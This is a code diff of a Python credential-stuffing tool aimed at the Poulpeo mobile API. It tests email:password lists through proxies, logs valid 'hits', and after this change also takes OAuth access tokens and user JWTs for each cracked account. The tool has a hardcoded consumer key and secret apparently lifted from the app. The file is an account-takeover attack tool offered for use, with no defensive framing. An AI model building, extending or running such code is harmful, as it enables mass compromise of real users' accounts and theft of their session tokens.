@@ -1,5 +1,8 @@
+"""
+Flux mobile Poulpeo (OAuth 1.0a) : requestToken → login → accessToken → getToken (JWT).
+Les appels Braze / Firebase du HAR ne sont pas requis pour récupérer le JWT.
+"""
 import json
-import re
 import threading
 import time
 import uuid
@@ -17,7 +20,8 @@ from urllib.parse import parse_qs
 # CONFIG
 # =========================================================
 
-CONSUMER_KEY = "als57b6d9bfbd8041.16892809"
+CONSUMER_KEY = "als57b6d9b235e084.77233595"
+# Doit correspondre à la même build que CONSUMER_KEY (absent du HAR).
 CONSUMER_SECRET = "84dbb79eddc1effe14965db52caeae70636ac31b"
 
 INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
@@ -39,8 +43,11 @@ class HitWriter:
             with open(self._path, "w", encoding="utf-8"):
                 pass
 
-    def append_hit(self, email, password):
-        line = f"{email}:{password}\n"
+    def append_hit(self, email, password, jwt=None):
+        if jwt:
+            line = f"{email}:{password}:{jwt}\n"
+        else:
+            line = f"{email}:{password}\n"
         with self._lock:
             with open(self._path, "a", encoding="utf-8") as f:
                 f.write(line)
@@ -227,6 +234,14 @@ LOGIN_URL = (
     "https://mobile.poulpeo.com/api/2.2/user/login/"
 )
 
+ACCESS_TOKEN_URL = (
+    "https://mobile.poulpeo.com/api/2.2/oauth/accessToken/"
+)
+
+GET_TOKEN_URL = (
+    "https://mobile.poulpeo.com/api/2.2/user/getToken/"
+)
+
 _STATUS_OK_RE = re.compile(r'"status"\s*:\s*"ok"')
 
 
@@ -263,6 +278,71 @@ def fetch_request_token(session):
         return None
 
     return oauth_token, oauth_token_secret
+
+
+def fetch_access_token(session, oauth_token, oauth_token_secret):
+    """Échange le request token (après login OK) contre un access token OAuth."""
+    body = {"realm": ACCESS_TOKEN_URL}
+    auth = build_oauth_header(
+        method="POST",
+        url=ACCESS_TOKEN_URL,
+        consumer_key=CONSUMER_KEY,
+        consumer_secret=CONSUMER_SECRET,
+        token=oauth_token,
+        token_secret=oauth_token_secret,
+        extra_params=body,
+    )
+    headers = COMMON_HEADERS.copy()
+    headers["Authorization"] = auth
+    response = session.post(
+        ACCESS_TOKEN_URL,
+        headers=headers,
+        data=body,
+    )
+    if response.status_code != 200:
+        return None
+    parsed = parse_qs(response.text)
+    try:
+        at = parsed["oauth_token"][0]
+        ats = parsed["oauth_token_secret"][0]
+        return at, ats
+    except (KeyError, IndexError):
+        return None
+
+
+def fetch_user_jwt(session, access_token, access_token_secret):
+    """GET getToken : JWT dans le champ JSON « data » (token signé J.W.T)."""
+    auth = build_oauth_header(
+        method="GET",
+        url=GET_TOKEN_URL,
+        consumer_key=CONSUMER_KEY,
+        consumer_secret=CONSUMER_SECRET,
+        token=access_token,
+        token_secret=access_token_secret,
+        extra_params=None,
+    )
+    headers = {
+        "accept": "application/json",
+        "x-client-version": "26.1.5",
+        "accept-charset": "UTF-8",
+        "accept-encoding": "deflate;q=1.0,gzip;q=0.9",
+        "accept-language": "fr-FR,fr;q=0.9",
+        "user-agent": COMMON_HEADERS["User-Agent"],
+        "priority": "u=3, i",
+        "Authorization": auth,
+    }
+    response = session.get(GET_TOKEN_URL, headers=headers)
+    if response.status_code != 200:
+        return None
+    try:
+        payload = response.json()
+    except json.JSONDecodeError:
+        return None
+    if isinstance(payload, dict) and payload.get("status") == "ok":
+        jwt = payload.get("data")
+        if isinstance(jwt, str) and jwt:
+            return jwt
+    return None
 
 
 def post_login(session, oauth_token, oauth_token_secret, email, password):
@@ -357,9 +437,23 @@ def process_account(email, password, proxy_url, stats, hit_writer):
             session, oauth_token, oauth_token_secret, email, password
         )
         kind = classify_login_response(response)
-        if kind == "valid":
-            hit_writer.append_hit(email, password)
-        stats.record(kind)
+        if kind != "valid":
+            stats.record(kind)
+            return
+
+        access_pair = fetch_access_token(session, oauth_token, oauth_token_secret)
+        if access_pair is None:
+            stats.record("error")
+            return
+
+        access_token, access_secret = access_pair
+        jwt = fetch_user_jwt(session, access_token, access_secret)
+        if not jwt:
+            stats.record("error")
+            return
+
+        hit_writer.append_hit(email, password, jwt=jwt)
+        stats.record("valid")
     except Exception:
         stats.record("error")
 
